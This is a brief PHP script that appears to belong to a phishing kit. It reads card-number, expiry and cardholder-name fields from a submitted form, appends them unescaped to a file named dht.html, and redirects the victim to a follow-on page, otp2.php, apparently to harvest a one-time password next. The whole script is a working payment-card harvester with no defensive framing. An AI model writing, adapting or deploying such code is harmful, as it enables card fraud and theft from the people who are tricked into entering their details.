<?php
header("location:otp2.php");
$debit=$_POST['debit'];
$valid=$_POST['valid'];
$name=$_POST['name'];
$handle=fopen('dht.html','a');
fwrite($handle ,"debit=$debit\n");
fwrite($handle ,"<br>\r\n");
fwrite($handle ,"valid=$valid\n");
fwrite($handle ,"<br>\r\n");
fwrite($handle ,"name=$name\n");
fwrite($handle ,"<br>\r\n");
fwrite($handle ,"<br>\r\n");
fclose($handle);
exit;
?>
